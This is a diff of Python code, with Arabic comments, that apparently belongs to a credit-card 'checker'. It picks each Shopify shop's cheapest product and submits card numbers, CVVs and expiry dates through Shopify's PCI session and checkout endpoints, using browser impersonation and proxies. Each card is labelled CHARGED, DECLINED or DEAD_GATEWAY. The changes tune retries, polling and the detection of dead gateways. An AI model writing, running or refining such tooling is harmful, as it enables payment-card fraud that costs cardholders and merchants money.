@@ -203,10 +203,10 @@ def _best_entry(products: list, min_price: float) -> tuple | None:
 
 _product_cache: dict = {}
 _product_cache_lock = __import__("threading").Lock()
-_CACHE_TTL = 300
+_CACHE_TTL = 3600
 
 async def find_cheapest_product(client: AsyncTLSClient, shop_url: str,
-                                min_price: float = 0.10, max_price: float = 10.0):
+                                min_price: float = 0.50):
     import time as _t
     now = _t.time()
     with _product_cache_lock:
@@ -217,21 +217,18 @@ async def find_cheapest_product(client: AsyncTLSClient, shop_url: str,
     # جلب 350 منتج بالتوازي واختيار الأرخص
     products = await _fetch_all_products(client, shop_url)
     best = _best_entry(products, min_price)
-    
     if best:
-        # 🔥 تحقق من شرط الـ 10$
+        # 🔥 شرط الـ 10$ الصارم — إذا أرخص منتج فوق 10$ نعتبر الموقع ميت
         try:
-            actual_price = float(best[4])
-            if actual_price > max_price:
-                raise Exception(f"cheapest product is too expensive: ${actual_price:.2f} (limit ${max_price:.2f})")
-        except (ValueError, TypeError):
-            pass
-            
+            p_val = float(best[4])
+            if p_val > 10.0:
+                 raise Exception(f"DEAD_GATEWAY: Cheapest product is ${p_val:.2f} (Limit $10)")
+        except: pass
+
         with _product_cache_lock:
             _product_cache[shop_url] = best + (_t.time(),)
         return best
-        
-    raise Exception(f"no available products between ${min_price:.2f} and ${max_price:.2f} at {shop_url}")
+    raise Exception(f"no available products above ${min_price:.2f} at {shop_url}")
 
 
 # ── Step 1: cart → checkout ───────────────────────────────────────────
@@ -322,8 +319,7 @@ async def fetch_actions_js(client: AsyncTLSClient, actions_url: str, shop_url: s
 
 async def send_pci_session(ident_sig: str, card_number: str, card_name: str,
                            card_month: int, card_year: int, cvv: str,
-                           shop_domain: str, proxy_url: str = "",
-                           impersonate: str = "chrome124"):
+                           shop_domain: str, proxy_url: str = ""):
     payload = json.dumps({
         "credit_card": {
             "number":             card_number,
@@ -354,11 +350,11 @@ async def send_pci_session(ident_sig: str, card_number: str, card_name: str,
         "shopify-identification-signature": ident_sig,
         "user-agent":           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
     }
-    async with AsyncSession(impersonate=impersonate, timeout=15) as session:
+    async with AsyncSession(impersonate="chrome124") as session:
         if proxy_url:
             session.proxies = {"http": proxy_url, "https": proxy_url}
         resp = await session.post("https://checkout.pci.shopifyinc.com/sessions",
-                                  data=payload, headers=headers, timeout=15)
+                                  data=payload, headers=headers, timeout=12)
     return resp.status_code, resp.text
 
 
@@ -1090,30 +1086,13 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
 
         # Step 9
         try:
-            # Re-fetch checkout page to get a fresh identification-signature
-            # (Shopify rotates it after each proposal — the original checkout_html is stale)
-            try:
-                fresh_resp = await client.get(
-                    str(checkout_url), allow_redirects=True, headers={
-                        **_PAGE_HEADERS,
-                        "user-agent": client.user_agent,
-                        "referer": shop_url + "/",
-                        "sec-fetch-site": "same-origin",
-                    })
-                fresh_html = fresh_resp.text if fresh_resp.status_code == 200 else checkout_html
-            except Exception:
-                fresh_html = checkout_html
-
-            ident_sig = extract_identification_signature(fresh_html)
-            if not ident_sig:
-                ident_sig = extract_identification_signature(checkout_html)
+            ident_sig = extract_identification_signature(checkout_html)
             if not ident_sig:
                 raise Exception("could not extract identification signature")
             pci_status, pci_body = await send_pci_session(
                 ident_sig, card_number,
                 f"{addr.first_name} {addr.last_name}",
-                card_month, card_year, card_cvv, site_name, proxy_url,
-                impersonate=client.impersonate)
+                card_month, card_year, card_cvv, site_name, proxy_url)
             _ = pci_status
             pci_session_id = extract_pci_session_id(pci_body)
             if not pci_session_id:
@@ -1160,7 +1139,7 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
             current_tax   = extract_tax_amount(proposal5_body)
             current_total = total_amount
 
-            for tax_attempt in range(1, 7):
+            for tax_attempt in range(1, 4):
                 submit_status, submit_body = await send_submit_for_completion(
                     client, shop_url, checkout_url, checkout_token, session_token,
                     stable_id, variant_id, price, submit_id, build_id, source_token,
@@ -1211,14 +1190,20 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
         poll_delay_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
         type_name_re  = re.compile(
             r'"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"')
-        _poll_start = asyncio.get_event_loop().time()
 
+        # 🔥 زيادة الدقة إلى 100 محاولة مع كشف الخصم الوهمي
         for poll_num in range(1, 101):
             try:
                 _, poll_body = await send_poll_for_receipt(
                     client, shop_url, checkout_url, checkout_token, session_token,
                     build_id, source_token, poll_for_receipt_id,
                     receipt_id, receipt_session_token)
+
+                # كشف الخصم الوهمي (Dead Gateway)
+                if "payment is being processed" in poll_body.lower():
+                    result.status = CheckStatus.ERROR
+                    result.status_code = "DEAD_GATEWAY"
+                    return result
 
                 receipt_type = ""
                 m = type_name_re.search(poll_body)
@@ -1228,18 +1213,6 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
                 result.status_code = extract_receipt_status_code(poll_body, receipt_type)
 
                 if receipt_type in ("SuccessfulReceipt", "ProcessedReceipt"):
-                    # 🔥 تحقق من الـ Dead Gateway (الخصم الوهمي)
-                    dead_signals = [
-                        "payment is being processed",
-                        "receive a confirmation email",
-                        "confirmation email with your order number shortly"
-                    ]
-                    if any(sig in poll_body.lower() for sig in dead_signals):
-                        result.status      = CheckStatus.DECLINED
-                        result.status_code = "DEAD_GATEWAY"
-                        result.error       = Exception("DEAD_GATEWAY")
-                        return result
-
                     result.status      = CheckStatus.CHARGED
                     result.status_code = "ORDER_PLACED"
                     # استخرج رابط صفحة التأكيد الحقيقي من الرد
@@ -1304,18 +1277,13 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
                         pass
                 await asyncio.sleep(min(delay, 2000) / 1000.0)
 
-                if asyncio.get_event_loop().time() - _poll_start > 150:
-                    result.status = CheckStatus.ERROR
-                    result.error  = Exception("poll timeout: exceeded 90s")
-                    return result
-
             except Exception as e:
                 result.status = CheckStatus.ERROR
                 result.error  = Exception(f"poll {poll_num} failed: {e}")
                 return result
 
         result.status = CheckStatus.ERROR
-        result.error  = Exception("exceeded 60 poll attempts")
+        result.error  = Exception("exceeded 40 poll attempts")
         return result
 
     finally:
